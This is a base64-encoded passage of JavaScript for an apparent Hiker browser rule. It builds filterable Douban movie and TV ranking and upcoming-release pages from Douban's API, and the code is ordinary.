c2UocmVxdWVzdCgnaGlrZXI6Ly9wYWdlL21haW4nKSkucnVsZSk7XFxyXFxuICAgICAgICAgICAgaWYgKHR5cGUgPT09IFxcXCJwbGF5bGlzdFxcXCIpIHtcXHJcXG4gICAgICAgICAgICAgICAgZG91TGlzdChpZCwgTVlfUEFHRSwgNTApO1xcclxcbiAgICAgICAgICAgIH0gZWxzZSB7XFxyXFxuICAgICAgICAgICAgICAgIHN1YmplY3RDb2xsZWN0aW9uTGlzdChNWV9QQUdFLCA1MCwgaWQpO1xcclxcbiAgICAgICAgICAgIH1cXHJcXG4gICAgICAgIH0sIGUudHlwZSwgZS5pZCksXFxyXFxuICAgICAgICBpbWc6IGUuY292ZXJfdXJsICsgXFxcIkBSZWZlcmVyPVxcXCIgKyBlLmNvdmVyX3VybCxcXHJcXG4gICAgICAgIGRlc2M6IFxcXCLlhbFcXFwiICsgZS5pdGVtc19jb3VudCArIFxcXCLpg6hcXFwiXFxyXFxuICAgIH0pKSk7XFxyXFxuXFxyXFxuICAgIHJldHVybiBwYWdlID4gMSA/IGkgOiBhLmNvbmNhdChpKTtcXHJcXG59XFxyXFxuXFxyXFxuLy/mppzljZVcXHJcXG5mdW5jdGlvbiByYW5rTGlzdChwYWdlLCBjb3VudCkge1xcclxcbiAgICBpZiAoIWdldE15VmFyKCdyYW5rTGlzdCcpKSBwdXRNeVZhcigncmFua0xpc3QnLCAne1xcXCJ0eXBlXFxcIjpcXFwibW92aWVcXFwiLFxcXCJsaXN0XFxcIjpcXFwicmFua19saXN0XFxcIixcXFwieWVhcl9saXN0c1xcXCI6W10sXFxcImNhdGVnb3J5X2xpc3RzXFxcIjpbXSxcXFwieWVhclxcXCI6XFxcIlxcXCIsXFxcImNhdGVnb3J5XFxcIjpcXFwiXFxcIn0nKTtcXHJcXG4gICAgbGV0IGEgPSBbXTtcXHJcXG4gICAgbGV0IHRlbXAgPSBKU09OLnBhcnNlKGdldE15VmFyKCdyYW5rTGlzdCcpKTtcXHJcXG4gICAgbGV0IGNvbG9yID0gZ2V0Q29uZmlnKCdjaG9vc2VDb2xvcicpO1xcclxcblxcclxcbiAgICBsZXQgaXRlbXMgPSB7XFxyXFxuICAgICAgICDnlLXlvbE6ICdtb3ZpZScsXFxyXFxuICAgICAgICDnlLXop4bliac6ICd0didcXHJcXG4gICAgfVxcclxcbiAgICBmb3IgKGxldCBpIGluIGl0ZW1zKSB7XFxyXFxuICAgICAgICBhLnB1c2goe1xcclxcbiAgICAgICAgICAgIHRpdGxlOiB0ZW1wLnR5cGUgPT0gaXRlbXNbaV0gPyAn4oCc4oCc4oCd4oCdPGI+IDxmb250IGNvbG9yPScgKyBjb2xvciArICc+JyArIGkgKyAnIDwvZm9udD48L2I+JyA6IGksXFxyXFxuICAgICAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJyxcXHJcXG4gICAgICAgICAgICB1cmw6ICQoJ2hpa2VyOi8vZW1wdHkjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChlKSA9PiB7XFxyXFxuICAgICAgICAgICAgICAgIGxldCB0ZW1wID0gSlNPTi5wYXJzZShnZXRNeVZhcigncmFua0xpc3QnKSk7XFxyXFxuICAgICAgICAgICAgICAgIHRlbXAudHlwZSA9IGU7XFxyXFxuICAgICAgICAgICAgICAgIHB1dE15VmFyKFxcXCJyYW5rTGlzdFxcXCIsIEpTT04uc3RyaW5naWZ5KHRlbXApKTtcXHJcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXHJcXG4gICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcclxcbiAgICAgICAgICAgIH0sIGl0ZW1zW2ldKVxcclxcbiAgICAgICAgfSlcXHJcXG4gICAgfVxcclxcblxcclxcbiAgICBhLnB1c2goe1xcclxcbiAgICAgICAgY29sX3R5cGU6IFxcXCJibGFua19ibG9ja1xcXCJcXHJcXG4gICAgfSlcXHJcXG5cXHJcXG4gICAgbGV0IGxpc3QgPSB7XFxyXFxuICAgICAgICDlj6PnopHmppzljZU6ICdyYW5rX2xpc3QnLFxcclxcbiAgICAgICAg5bm05bqm5qac5Y2VOiAneWVhcl9yYW5rcycsXFxyXFxuICAgICAgICDnsbvlnovmppzljZU6ICdjYXRlZ29yeV9yYW5rcydcXHJcXG4gICAgfVxcclxcbiAgICBmb3IgKGxldCBpIGluIGxpc3QpIHtcXHJcXG4gICAgICAgIGEucHVzaCh7XFxyXFxuICAgICAgICAgICAgdGl0bGU6IHRlbXAubGlzdCA9PSBsaXN0W2ldID8gJ+KAnOKAnOKAneKAnTxiPiA8Zm9udCBjb2xvcj0nICsgY29sb3IgKyAnPicgKyBpICsgJyA8L2ZvbnQ+PC9iPicgOiBpLFxcclxcbiAgICAgICAgICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbicsXFxyXFxuICAgICAgICAgICAgdXJsOiAkKCdoaWtlcjovL2VtcHR5I25vTG9hZGluZyMnKS5sYXp5UnVsZSgoZSkgPT4ge1xcclxcbiAgICAgICAgICAgICAgICBsZXQgdGVtcCA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoJ3JhbmtMaXN0JykpO1xcclxcbiAgICAgICAgICAgICAgICB0ZW1wLmxpc3QgPSBlO1xcclxcbiAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFwicmFua0xpc3RcXFwiLCBKU09OLnN0cmluZ2lmeSh0ZW1wKSk7XFxyXFxuICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxyXFxuICAgICAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXHJcXG4gICAgICAgICAgICB9LCBsaXN0W2ldKVxcclxcbiAgICAgICAgfSlcXHJcXG4gICAgfVxcclxcblxcclxcbiAgICBpZiAodGVtcC5saXN0ID09ICd5ZWFyX3JhbmtzJyAmJiB0ZW1wLnllYXJfbGlzdHMubGVuZ3RoID09IDApIHtcXHJcXG4gICAgICAgIGxldCB0ID0gZ2V0RG91YmFuUmVzKFxcXCJodHRwczovL2Zyb2RvLmRvdWJhbi5jb20vYXBpL3YyL1xcXCIgKyB0ZW1wLnR5cGUgKyAnL3JhbmtfbGlzdCcpO1xcclxcbiAgICAgICAgdGVtcC55ZWFyX2xpc3RzID0gdC5ncm91cHNbMV0udGFicztcXHJcXG4gICAgICAgIHB1dE15VmFyKCdyYW5rTGlzdCcsIEpTT04uc3RyaW5naWZ5KHRlbXApKTtcXHJcXG4gICAgfSBlbHNlIGlmICh0ZW1wLmxpc3QgPT0gJ2NhdGVnb3J5X3JhbmtzJyAmJiB0ZW1wLmNhdGVnb3J5X2xpc3RzLmxlbmd0aCA9PSAwKSB7XFxyXFxuICAgICAgICBsZXQgdCA9IGdldERvdWJhblJlcyhcXFwiaHR0cHM6Ly9mcm9kby5kb3ViYW4uY29tL2FwaS92Mi9cXFwiICsgdGVtcC50eXBlICsgJy9yYW5rX2xpc3QnKTtcXHJcXG4gICAgICAgIHRlbXAuY2F0ZWdvcnlfbGlzdHMgPSB0Lmdyb3Vwc1syXS50YWJzO1xcclxcbiAgICAgICAgcHV0TXlWYXIoJ3JhbmtMaXN0JywgSlNPTi5zdHJpbmdpZnkodGVtcCkpO1xcclxcbiAgICB9XFxyXFxuXFxyXFxuICAgIGlmICh0ZW1wLmxpc3QgPT0gJ3llYXJfcmFua3MnKSB7XFxyXFxuICAgICAgICBhLnB1c2goe1xcclxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFwiYmxhbmtfYmxvY2tcXFwiXFxyXFxuICAgICAgICB9KVxcclxcbiAgICAgICAgaWYgKCF0ZW1wLnllYXIpIHRlbXAueWVhciA9IHRlbXAueWVhcl9saXN0c1swXS5rZXk7XFxyXFxuICAgICAgICBmb3IgKGxldCB0IG9mIHRlbXAueWVhcl9saXN0cykge1xcclxcbiAgICAgICAgICAgIGEucHVzaCh7XFxyXFxuICAgICAgICAgICAgICAgIHRpdGxlOiB0ZW1wLnllYXIgPT0gdC5rZXkgPyAn4oCc4oCc4oCd4oCdPGI+IDxmb250IGNvbG9yPScgKyBjb2xvciArICc+JyArIHQudGl0bGUgKyAnIDwvZm9udD48L2I+JyA6IHQudGl0bGUsXFxyXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbicsXFxyXFxuICAgICAgICAgICAgICAgIHVybDogJCgnaGlrZXI6Ly9lbXB0eSNub0xvYWRpbmcjJykubGF6eVJ1bGUoKGUpID0+IHtcXHJcXG4gICAgICAgICAgICAgICAgICAgIGxldCB0ZW1wID0gSlNPTi5wYXJzZShnZXRNeVZhcigncmFua0xpc3QnKSk7XFxyXFxuICAgICAgICAgICAgICAgICAgICB0ZW1wLnllYXIgPSBlO1xcclxcbiAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcInJhbmtMaXN0XFxcIiwgSlNPTi5zdHJpbmdpZnkodGVtcCkpO1xcclxcbiAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXHJcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXHJcXG4gICAgICAgICAgICAgICAgfSwgdC5rZXkpXFxyXFxuICAgICAgICAgICAgfSlcXHJcXG4gICAgICAgIH1cXHJcXG4gICAgfSBlbHNlIGlmICh0ZW1wLmxpc3QgPT0gJ2NhdGVnb3J5X3JhbmtzJykge1xcclxcbiAgICAgICAgYS5wdXNoKHtcXHJcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcImJsYW5rX2Jsb2NrXFxcIlxcclxcbiAgICAgICAgfSlcXHJcXG4gICAgICAgIGlmICghdGVtcC5jYXRlZ29yeSkgdGVtcC5jYXRlZ29yeSA9IHRlbXAuY2F0ZWdvcnlfbGlzdHNbMF0ua2V5O1xcclxcbiAgICAgICAgZm9yIChsZXQgdCBvZiB0ZW1wLmNhdGVnb3J5X2xpc3RzKSB7XFxyXFxuICAgICAgICAgICAgYS5wdXNoKHtcXHJcXG4gICAgICAgICAgICAgICAgdGl0bGU6IHRlbXAuY2F0ZWdvcnkgPT0gdC5rZXkgPyAn4oCc4oCc4oCd4oCdPGI+IDxmb250IGNvbG9yPScgKyBjb2xvciArICc+JyArIHQudGl0bGUgKyAnIDwvZm9udD48L2I+JyA6IHQudGl0bGUsXFxyXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbicsXFxyXFxuICAgICAgICAgICAgICAgIHVybDogJCgnaGlrZXI6Ly9lbXB0eSNub0xvYWRpbmcjJykubGF6eVJ1bGUoKGUpID0+IHtcXHJcXG4gICAgICAgICAgICAgICAgICAgIGxldCB0ZW1wID0gSlNPTi5wYXJzZShnZXRNeVZhcigncmFua0xpc3QnKSk7XFxyXFxuICAgICAgICAgICAgICAgICAgICB0ZW1wLmNhdGVnb3J5ID0gZTtcXHJcXG4gICAgICAgICAgICAgICAgICAgIHB1dE15VmFyKFxcXCJyYW5rTGlzdFxcXCIsIEpTT04uc3RyaW5naWZ5KHRlbXApKTtcXHJcXG4gICAgICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxyXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxyXFxuICAgICAgICAgICAgICAgIH0sIHQua2V5KVxcclxcbiAgICAgICAgICAgIH0pXFxyXFxuICAgICAgICB9XFxyXFxuICAgIH1cXHJcXG5cXHJcXG4gICAgbGV0IGwgPSBbXTtcXHJcXG4gICAgaWYgKHRlbXAubGlzdCA9PSAncmFua19saXN0JyAmJiBNWV9QQUdFID09IDEpIHtcXHJcXG4gICAgICAgIGxldCBzID0gZ2V0RG91YmFuUmVzKFxcXCJodHRwczovL2Zyb2RvLmRvdWJhbi5jb20vYXBpL3YyL1xcXCIgKyB0ZW1wLnR5cGUgKyAnLycgKyB0ZW1wLmxpc3QgKyAocGFnZSA/IFxcXCI/c3RhcnQ9XFxcIiArIChwYWdlIC0gMSkgKiBjb3VudCArIFxcXCImY291bnQ9XFxcIiArIGNvdW50IDogXFxcIj9zdGFydD0wJmNvdW50PTEwXFxcIikpO1xcclxcbiAgICAgICAgbCA9IHMuZ3JvdXBzWzBdLnNlbGVjdGVkX2NvbGxlY3Rpb25zO1xcclxcbiAgICB9IGVsc2UgaWYgKHRlbXAubGlzdCA9PSAneWVhcl9yYW5rcycgJiYgTVlfUEFHRSA9PSAxKSB7XFxyXFxuICAgICAgICBsZXQgcyA9IGdldERvdWJhblJlcyhcXFwiaHR0cHM6Ly9mcm9kby5kb3ViYW4uY29tL2FwaS92Mi9cXFwiICsgdGVtcC50eXBlICsgJy8nICsgdGVtcC5saXN0ICsgJz95ZWFyPScgKyB0ZW1wLnllYXIgKyAocGFnZSA/IFxcXCImc3RhcnQ9XFxcIiArIChwYWdlIC0gMSkgKiBjb3VudCArIFxcXCImY291bnQ9XFxcIiArIGNvdW50IDogXFxcIiZzdGFydD0wJmNvdW50PTEwXFxcIikpO1xcclxcbiAgICAgICAgbCA9IHMuZ3JvdXBzWzBdLnNlbGVjdGVkX2NvbGxlY3Rpb25zO1xcclxcbiAgICB9IGVsc2UgaWYgKHRlbXAubGlzdCA9PSAnY2F0ZWdvcnlfcmFua3MnKSB7XFxyXFxuICAgICAgICBsZXQgcyA9IGdldERvdWJhblJlcyhcXFwiaHR0cHM6Ly9mcm9kby5kb3ViYW4uY29tL2FwaS92Mi9cXFwiICsgdGVtcC50eXBlICsgJy8nICsgdGVtcC5saXN0ICsgJz9jYXRlZ29yeT0nICsgdGVtcC5jYXRlZ29yeSArIChwYWdlID8gXFxcIiZzdGFydD1cXFwiICsgKHBhZ2UgLSAxKSAqIGNvdW50ICsgXFxcIiZjb3VudD1cXFwiICsgY291bnQgOiBcXFwiJnN0YXJ0PTAmY291bnQ9MTBcXFwiKSk7XFxyXFxuICAgICAgICBsID0gcy5zZWxlY3RlZF9jb2xsZWN0aW9ucztcXHJcXG4gICAgfVxcclxcblxcclxcbiAgICBsZXQgaSA9IFtdO1xcclxcbiAgICBpZiAodGVtcC5saXN0ID09ICdjYXRlZ29yeV9yYW5rcycpIHtcXHJcXG4gICAgICAgIGkgPSBsLm1hcCgoZSA9PiAoe1xcclxcbiAgICAgICAgICAgIHRpdGxlOiAn4oCc4oCc4oCd4oCdJyArIGUudGl0bGUuYm9sZCgpLFxcclxcbiAgICAgICAgICAgIHVybDogJCgnaGlrZXI6Ly9lbXB0eS8kcGFnZXtmeXBhZ2V9I25vSGlzdG9yeSMnKS5ydWxlKCh0eXBlLCBpZCkgPT4ge1xcclxcbiAgICAgICAgICAgICAgICBldmFsKEpTT04ucGFyc2UocmVxdWVzdCgnaGlrZXI6Ly9wYWdlL21haW4nKSkucnVsZSk7XFxyXFxuICAgICAgICAgICAgICAgIGlmICh0eXBlID09PSBcXFwicGxheWxpc3RcXFwiKSB7XFxyXFxuICAgICAgICAgICAgICAgICAgICBkb3VMaXN0KGlkLCBNWV9QQUdFLCA1MCk7XFxyXFxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxyXFxuICAgICAgICAgICAgICAgICAgICBzdWJqZWN0Q29sbGVjdGlvbkxpc3QoTVlfUEFHRSwgNTAsIGlkKTtcXHJcXG4gICAgICAgICAgICAgICAgfVxcclxcbiAgICAgICAgICAgIH0sIGUudHlwZSwgZS5pZCksXFxyXFxuICAgICAgICAgICAgaW1nOiBlLmNvdmVyX3VybCArIFxcXCJAUmVmZXJlcj1cXFwiICsgZS5jb3Zlcl91cmwsXFxyXFxuICAgICAgICAgICAgZGVzYzogXFxcIuWFsVxcXCIgKyBlLnRvdGFsICsgXFxcIumDqFxcXCJcXHJcXG4gICAgICAgIH0pKSk7XFxyXFxuICAgIH0gZWxzZSB7XFxyXFxuICAgICAgICBpID0gbC5tYXAoKGUgPT4gKHtcXHJcXG4gICAgICAgICAgICB0aXRsZTogJycgLyon4oCc4oCc4oCd4oCdJyArIGUubWVkaXVtX25hbWUgKyAnXFxcXG4nICsgZ2V0U3Ryb25nVGV4dChlLnRpdGxlKSovICxcXHJcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ2NhcmRfcGljXzInLFxcclxcbiAgICAgICAgICAgIHVybDogJCgnaGlrZXI6Ly9lbXB0eS8kcGFnZXtmeXBhZ2V9I25vSGlzdG9yeSMnKS5ydWxlKCh0eXBlLCBpZCwgc3RpdGxlKSA9PiB7XFxyXFxuICAgICAgICAgICAgICAgIHNldFBhZ2VUaXRsZShzdGl0bGUpO1xcclxcbiAgICAgICAgICAgICAgICBldmFsKEpTT04ucGFyc2UocmVxdWVzdCgnaGlrZXI6Ly9wYWdlL21haW4nKSkucnVsZSk7XFxyXFxuICAgICAgICAgICAgICAgIGlmICh0eXBlID09PSBcXFwicGxheWxpc3RcXFwiKSB7XFxyXFxuICAgICAgICAgICAgICAgICAgICBkb3VMaXN0KGlkLCBNWV9QQUdFLCA1MCk7XFxyXFxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxyXFxuICAgICAgICAgICAgICAgICAgICBzdWJqZWN0Q29sbGVjdGlvbkxpc3QoTVlfUEFHRSwgNTAsIGlkKTtcXHJcXG4gICAgICAgICAgICAgICAgfVxcclxcbiAgICAgICAgICAgIH0sIGUudHlwZSwgZS5pZCwgZS50aXRsZSksXFxyXFxuICAgICAgICAgICAgaW1nOiBlLmNvdmVyX3VybCArIFxcXCJAUmVmZXJlcj1cXFwiICsgZS5jb3Zlcl91cmwsXFxyXFxuICAgICAgICAgICAgZGVzYzogXFxcIjBcXFwiXFxyXFxuICAgICAgICB9KSkpO1xcclxcbiAgICB9XFxyXFxuXFxyXFxuICAgIHJldHVybiBwYWdlID4gMSA/IGkgOiBhLmNvbmNhdChpKTtcXHJcXG59XFxyXFxuXFxyXFxuLy/lsIbkuIrmmKBcXHJcXG5mdW5jdGlvbiBjb21pbmdMaXN0KHBhZ2UsIGNvdW50KSB7XFxyXFxuICAgIGlmICghZ2V0TXlWYXIoJ2NvbWluZycpKSBwdXRNeVZhcignY29taW5nJywgJ3tcXFwidHlwZVxcXCI6XFxcIm1vdmllXFxcIixcXFwicmFua1xcXCI6XFxcIiZzb3J0Ynk9aG90XFxcIixcXFwibG9jYWxcXFwiOlxcXCJkb21lc3RpY1xcXCIsXFxcImFyZWFcXFwiOlxcXCJcXFwiLFxcXCJmaWx0ZXJcXFwiOlxcXCJcXFwifScpO1xcclxcbiAgICBsZXQgYSA9IFtdO1xcclxcbiAgICBsZXQgdGVtcCA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoJ2NvbWluZycpKTtcXHJcXG4gICAgbGV0IGNvbG9yID0gZ2V0Q29uZmlnKCdjaG9vc2VDb2xvcicpO1xcclxcblxcclxcbiAgICBsZXQgaXRlbXMgPSB7XFxyXFxuICAgICAgICDnlLXlvbE6ICdtb3ZpZScsXFxyXFxuICAgICAgICDnlLXop4bliac6ICd0didcXHJcXG4gICAgfVxcclxcbiAgICBmb3IgKGxldCBpIGluIGl0ZW1zKSB7XFxyXFxuICAgICAgICBhLnB1c2goe1xcclxcbiAgICAgICAgICAgIHRpdGxlOiB0ZW1wLnR5cGUgPT09IGl0ZW1zW2ldID8gJ+KAnOKAnOKAneKAnTxiPiA8Zm9udCBjb2xvcj0nICsgY29sb3IgKyAnPicgKyBpICsgJyA8L2ZvbnQ+PC9iPicgOiBpLFxcclxcbiAgICAgICAgICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbicsXFxyXFxuICAgICAgICAgICAgdXJsOiAkKCdoaWtlcjovL2VtcHR5I25vTG9hZGluZyMnKS5sYXp5UnVsZSgoZSkgPT4ge1xcclxcbiAgICAgICAgICAgICAgICBsZXQgdGVtcCA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoJ2NvbWluZycpKTtcXHJcXG4gICAgICAgICAgICAgICAgdGVtcC50eXBlID0gZTtcXHJcXG4gICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcImNvbWluZ1xcXCIsIEpTT04uc3RyaW5naWZ5KHRlbXApKTtcXHJcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXHJcXG4gICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcclxcbiAgICAgICAgICAgIH0sIGl0ZW1zW2ldKVxcclxcbiAgICAgICAgfSlcXHJcXG4gICAgfVxcclxcbiAgICBsZXQgcmFuayA9IHtcXHJcXG4gICAgICAgIOeDreW6pjogJyZzb3J0Ynk9aG90JyxcXHJcXG4gICAgICAgIOaXtumXtDogJydcXHJcXG4gICAgfVxcclxcbiAgICBhLnB1c2goe1xcclxcbiAgICAgICAgY29sX3R5cGU6IFxcXCJibGFua19ibG9ja1xcXCJcXHJcXG4gICAgfSlcXHJcXG4gICAgZm9yIChsZXQgaSBpbiByYW5rKSB7XFxyXFxuICAgICAgICBhLnB1c2goe1xcclxcbiAgICAgICAgICAgIHRpdGxlOiB0ZW1wLnJhbmsgPT09IHJhbmtbaV0gPyAn4oCc4oCc4oCd4oCdPGI+IDxmb250IGNvbG9yPScgKyBjb2xvciArICc+JyArIGkgKyAnIDwvZm9udD48L2I+JyA6IGksXFxyXFxuICAgICAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJyxcXHJcXG4gICAgICAgICAgICB1cmw6ICQoJ2hpa2VyOi8vZW1wdHkjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChlKSA9PiB7XFxyXFxuICAgICAgICAgICAgICAgIGxldCB0ZW1wID0gSlNPTi5wYXJzZShnZXRNeVZhcignY29taW5nJykpO1xcclxcbiAgICAgICAgICAgICAgICB0ZW1wLnJhbmsgPSBlO1xcclxcbiAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFwiY29taW5nXFxcIiwgSlNPTi5zdHJpbmdpZnkodGVtcCkpO1xcclxcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcclxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxyXFxuICAgICAgICAgICAgfSwgcmFua1tpXSlcXHJcXG4gICAgICAgIH0pXFxyXFxuICAgIH1cXHJcXG4gICAgbGV0IGxvY2FsID0ge1xcclxcbiAgICAgICAg5Zu95YaFOiAnZG9tZXN0aWMnLFxcclxcbiAgICAgICAg5YWo55CDOiAnaW50ZXJuYXRpb25hbCdcXHJcXG4gICAgfVxcclxcbiAgICBpZiAodGVtcC50eXBlID09ICdtb3ZpZScpIHtcXHJcXG4gICAgICAgIGEucHVzaCh7XFxyXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJibGFua19ibG9ja1xcXCJcXHJcXG4gICAgICAgIH0pXFxyXFxuICAgICAgICBmb3IgKGxldCBpIGluIGxvY2FsKSB7XFxyXFxuICAgICAgICAgICAgYS5wdXNoKHtcXHJcXG4gICAgICAgICAgICAgICAgdGl0bGU6IHRlbXAubG9jYWwgPT09IGxvY2FsW2ldID8gJ+KAnOKAnOKAneKAnTxiPiA8Zm9udCBjb2xvcj0nICsgY29sb3IgKyAnPicgKyBpICsgJyA8L2ZvbnQ+PC9iPicgOiBpLFxcclxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nLFxcclxcbiAgICAgICAgICAgICAgICB1cmw6ICQoJ2hpa2VyOi8vZW1wdHkjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChlKSA9PiB7XFxyXFxuICAgICAgICAgICAgICAgICAgICBsZXQgdGVtcCA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoJ2NvbWluZycpKTtcXHJcXG4gICAgICAgICAgICAgICAgICAgIHRlbXAubG9jYWwgPSBlO1xcclxcbiAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcImNvbWluZ1xcXCIsIEpTT04uc3RyaW5naWZ5KHRlbXApKTtcXHJcXG4gICAgICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxyXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxyXFxuICAgICAgICAgICAgICAgIH0sIGxvY2FsW2ldKVxcclxcbiAgICAgICAgICAgIH0pXFxyXFxuICAgICAgICB9XFxyXFxuICAgIH1cXHJcXG4gICAgbGV0IGFyZWEgPSB7XFxyXFxuICAgICAgICDlhajpg6g6ICcnLFxcclxcbiAgICAgICAg576O5Zu9OiAnJmFyZWFfZmlsdGVyPWFtZXJpY2FuJyxcXHJcXG4gICAgICAgIOasp+a0sjogJyZhcmVhX2ZpbHRlcj1ldXJvcGUnLFxcclxcbiAgICAgICAg5pel5pysOiAnJmFyZWFfZmlsdGVyPWphcGFuZXNlJyxcXHJcXG4gICAgICAgIOmfqeWbvTogJyZhcmVhX2ZpbHRlcj1rb3JlYW4nXFxyXFxuICAgIH1cXHJcXG4gICAgaWYgKHRlbXAudHlwZSA9PSAnbW92aWUnICYmIHRlbXAubG9jYWwgPT0gJ2ludGVybmF0aW9uYWwnKSB7XFxyXFxuICAgICAgICBhLnB1c2goe1xcclxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFwiYmxhbmtfYmxvY2tcXFwiXFxyXFxuICAgICAgICB9KVxcclxcbiAgICAgICAgZm9yIChsZXQgaSBpbiBhcmVhKSB7XFxyXFxuICAgICAgICAgICAgYS5wdXNoKHtcXHJcXG4gICAgICAgICAgICAgICAgdGl0bGU6IHRlbXAuYXJlYSA9PT0gYXJlYVtpXSA/ICfigJzigJzigJ3igJ08Yj4gPGZvbnQgY29sb3I9JyArIGNvbG9yICsgJz4nICsgaSArICcgPC9mb250PjwvYj4nIDogaSxcXHJcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJyxcXHJcXG4gICAgICAgICAgICAgICAgdXJsOiAkKCdoaWtlcjovL2VtcHR5I25vTG9hZGluZyMnKS5sYXp5UnVsZSgoZSkgPT4ge1xcclxcbiAgICAgICAgICAgICAgICAgICAgbGV0IHRlbXAgPSBKU09OLnBhcnNlKGdldE15VmFyKCdjb21pbmcnKSk7XFxyXFxuICAgICAgICAgICAgICAgICAgICB0ZW1wLmFyZWEgPSBlO1xcclxcbiAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcImNvbWluZ1xcXCIsIEpTT04uc3RyaW5naWZ5KHRlbXApKTtcXHJcXG4gICAgICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxyXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxyXFxuICAgICAgICAgICAgICAgIH0sIGFyZWFbaV0pXFxyXFxuICAgICAgICAgICAgfSlcXHJcXG4gICAgICAgIH1cXHJcXG4gICAgfVxcclxcbiAgICBsZXQgZmlsdGVyID0ge1xcclxcbiAgICAgICAg5YWo6YOoOiAnJyxcXHJcXG4gICAgICAgIOWbveS6p+WJpzogJyZ0eXBlX2ZpbHRlcj10dl9kb21lc3RpYycsXFxyXFxuICAgICAgICDmrKfnvo7liac6ICcmdHlwZV9maWx0ZXI9dHZfYW1lcmljYW4nLFxcclxcbiAgICAgICAg5pel5YmnOiAnJnR5cGVfZmlsdGVyPXR2X2phcGFuZXNlJyxcXHJcXG4gICAgICAgIOmfqeWJpzogJyZ0eXBlX2ZpbHRlcj10dl9rb3JlYW4nLFxcclxcbiAgICAgICAg5Yqo55S7OiAnJnR5cGVfZmlsdGVyPXR2X2FuaW1hdGlvbicsXFxyXFxuICAgICAgICDlm73lhoXnu7zoibo6ICcmdHlwZV9maWx0ZXI9c2hvd19kb21lc3RpYycsXFxyXFxuICAgICAgICDlm73lpJbnu7zoibo6ICcmdHlwZV9maWx0ZXI9c2hvd19mb3JlaWduJ1xcclxcbiAgICB9XFxyXFxuICAgIGlmICh0ZW1wLnR5cGUgPT0gJ3R2Jykge1xcclxcbiAgICAgICAgYS5wdXNoKHtcXHJcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcImJsYW5rX2Jsb2NrXFxcIlxcclxcbiAgICAgICAgfSlcXHJcXG4gICAgICAgIGZvciAobGV0IGkgaW4gZmlsdGVyKSB7XFxyXFxuICAgICAgICAgICAgYS5wdXNoKHtcXHJcXG4gICAgICAgICAgICAgICAgdGl0bGU6IHRlbXAuZmlsdGVyID09PSBmaWx0ZXJbaV0gPyAn4oCc4oCc4oCd4oCdPGI+IDxmb250IGNvbG9yPScgKyBjb2xvciArICc+JyArIGkgKyAnIDwvZm9udD48L2I+JyA6IGksXFxyXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbicsXFxyXFxuICAgICAgICAgICAgICAgIHVybDogJCgnaGlrZXI6Ly9lbXB0eSNub0xvYWRpbmcjJykubGF6eVJ1bGUoKGUpID0+IHtcXHJcXG4gICAgICAgICAgICAgICAgICAgIGxldCB0ZW1wID0gSlNPTi5wYXJzZShnZXRNeVZhcignY29taW5nJykpO1xcclxcbiAgICAgICAgICAgICAgICAgICAgdGVtcC5maWx0ZXIgPSBlO1xcclxcbiAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcImNvbWluZ1xcXCIsIEpTT04uc3RyaW5naWZ5KHRlbXApKTtcXHJcXG4gICAgICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxyXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxyXFxuICAgICAgICAgICAgICAgIH0sIGZpbHRlcltpXSlcXHJcXG4gICAgICAgICAgICB9KVxc